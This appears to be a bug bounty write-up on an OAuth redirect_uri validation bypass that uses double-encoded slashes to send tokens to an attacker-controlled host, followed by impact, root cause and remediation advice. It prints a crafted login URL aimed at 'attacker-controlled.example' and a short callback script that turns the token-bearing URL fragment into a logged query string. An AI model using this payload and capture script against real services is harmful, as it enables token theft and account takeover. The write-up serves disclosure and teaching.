+++
title = "Stealing Users OAuth Tokens through redirect_uri Parameter"
date = 2026-07-12
description = "Analyzing an OAuth open redirect issue where weak redirect_uri validation could expose user tokens during a social login flow."
tags = [
"OAuth",
"Bug Bounty",
"Open Redirect",
"redirect_uri",
"Account Takeover",
"Access Token",
"Web Application Security"
]
+++

# Stealing Users OAuth Tokens through redirect_uri Parameter

## Overview

OAuth and social login flows are highly sensitive because they handle authentication state, identity tokens and access tokens. A small validation issue in parameters such as `redirect_uri` can have a much larger impact when tokens are returned through the browser.

During bug bounty testing, I identified an OAuth flow where the `redirect_uri` parameter could be abused through an open redirect behavior. Under specific conditions, this allowed OAuth tokens to be redirected to an attacker-controlled endpoint.

All target-specific domains in this writeup were replaced with `127.0.0.1` to avoid exposing the affected program.

---

## Discovery

The vulnerable flow was found during testing of a social login endpoint similar to the following:

```text
https://127.0.0.1/uim/oauth-client/auth/facebook?k=5b2ce30bd9a0bf285ac70c10&redirect_uri=https%3A%2F%2Faccount.127.0.0.1.com%2Flogging_in%3Fcountry%3DBR&opts=...
```

The request contained two important pieces:

- `redirect_uri`, which controlled where the browser would be sent after authentication.
- `opts`, which included OAuth options such as `response_type`, `nonce`, `state`, language and country.

The `opts` object included a response type similar to:

```json
{
  "response_type": "id_token token",
  "state_type": "client"
}
```

This was important because token-based response types may place sensitive values in the URL fragment after the OAuth flow completes.

---

## Technical Analysis

The application appeared to validate that `redirect_uri` pointed to an expected domain. However, the validation could be bypassed by abusing URL parsing behavior with double encoding.

A simplified example of the technique:

```text
https://127.0.0.1.com%252f@example.com/
```

After decoding and browser interpretation, the URL could be handled differently by different components in the flow. This type of mismatch can allow a value that appears to belong to an allowed domain during validation to eventually redirect the browser to another host.

In this case, the issue affected an OAuth flow, so the open redirect was not only a navigation problem. It created a path where tokens returned by the identity provider could be exposed to an external endpoint.

---

## Proof of Concept

For testing, I used a controlled server under my own control and replaced the real target with `127.0.0.1` in this writeup.

The controlled callback page was used only to prove whether the URL fragment containing OAuth data reached the external endpoint:

```html
<script>
window.location = "/?" + document.location.hash.substr(1)
</script>
```

This converts the URL fragment into a query string so the received values can be observed in server logs during an authorized test.

A sanitized malicious URL looked like this:

```text
https://127.0.0.1/uim/oauth-client/auth/facebook?k=5b2ce30bd9a0bf285ac70c10&redirect_uri=https://127.0.0.1.com%252f@attacker-controlled.example/&opts=%7B%22response_type%22%3A%22id_token%20token%22%2C%22nonce%22%3A%22REDACTED%22%2C%22language%22%3A%22pt%22%2C%22country%22%3A%22BR%22%2C%22source%22%3Anull%2C%22lucidId%22%3Anull%2C%22state%22%3A%22REDACTED%22%2C%22state_type%22%3A%22client%22%7D
```

When a victim followed the crafted login URL and completed the OAuth flow, the browser was redirected to the controlled endpoint. Because the OAuth flow used token-based response types, sensitive values could be exposed during the redirect chain.

---

## Impact

The impact was high because an attacker could potentially obtain OAuth tokens from affected users.

Depending on the permissions associated with the leaked token, this could lead to:

- unauthorized access to the victim account;
- account takeover scenarios;
- access to account data exposed by the application;
- destructive actions if the token allowed account management operations.

In the tested scenario, the token exposure could allow an attacker to access the victim account and perform sensitive account actions.

---

## Root Cause

The root cause was insufficient validation of the OAuth `redirect_uri` parameter.

Secure OAuth implementations should avoid relying on loose string checks, partial domain matching or parser behavior that can be influenced by encoding tricks. Redirect URIs should be strictly matched against a predefined allowlist of exact, registered callback URLs.

---

## Remediation

Recommended fixes include:

- enforce exact allowlist matching for OAuth redirect URIs;
- reject encoded path confusion patterns such as double-encoded slashes;
- avoid accepting user-controlled arbitrary redirect targets in OAuth flows;
- prefer authorization code flow with PKCE instead of token-based implicit-style responses;
- ensure tokens are never exposed to untrusted redirect destinations;
- validate redirect behavior after every decoding step used by the application.

---

## Thought Process

The key observation was that the issue was not just an open redirect. Open redirects inside OAuth flows can become much more severe when tokens or authorization artifacts are returned through the browser.

The testing process followed this path:

1. Identify a sensitive OAuth endpoint.
2. Inspect parameters that influenced redirect behavior.
3. Test whether `redirect_uri` validation could be bypassed.
4. Try encoding variations and parser-confusion payloads.
5. Confirm whether the final redirect reached an external controlled endpoint.
6. Evaluate whether OAuth tokens or authentication artifacts could be exposed.

This reinforced an important lesson: context matters. A redirect issue that might be low impact in one part of an application can become critical when placed inside an authentication flow.

---

## Key Takeaways

- OAuth redirect validation must be strict and exact.
- Open redirects inside authentication flows can lead to token leakage.
- Double encoding can expose differences between validation logic and browser interpretation.
- Token-based OAuth response types increase the risk when redirect behavior is weak.
- Bug bounty testing requires understanding the full flow, not only the vulnerable parameter.

---

## References

- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/rfc9700)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy - OAuth authentication vulnerabilities](https://portswigger.net/web-security/oauth)
- [PortSwigger Web Security Academy - Open redirection](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [RFC 6749 - The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)
